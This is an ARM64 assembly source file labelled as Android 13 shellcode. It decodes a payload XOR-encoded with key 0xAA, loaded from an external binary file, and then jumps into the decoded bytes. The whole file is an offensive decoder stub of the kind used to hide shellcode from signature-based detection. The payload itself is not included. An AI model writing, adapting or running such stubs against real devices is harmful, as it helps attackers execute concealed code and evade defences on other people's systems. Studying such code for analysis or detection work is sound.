// xor_encoded_shellcode.s - Android 13 ARM XOR Decoding Shellcode
// Decodes a payload encoded with XOR key 0xAA, then jumps to the decoded payload.
.global _start
.section .text
_start:
    ldr x0, =data_start   // Start of the encoded payload
    ldr x1, =data_end     // End address of the payload
    mov w2, #0xAA         // XOR key is 0xAA
decode_loop:
    cmp x0, x1
    beq decoded
    ldrb w3, [x0]
    eor w3, w3, w2
    strb w3, [x0]
    add x0, x0, #1
    b decode_loop
decoded:
    ldr x0, =data_start
    br x0                 // Branch to the decoded payload

.section .data
data_start:
    .incbin "xor_payload.bin"  // Ensure that 'xor_payload.bin' exists with the encoded payload.
data_end:
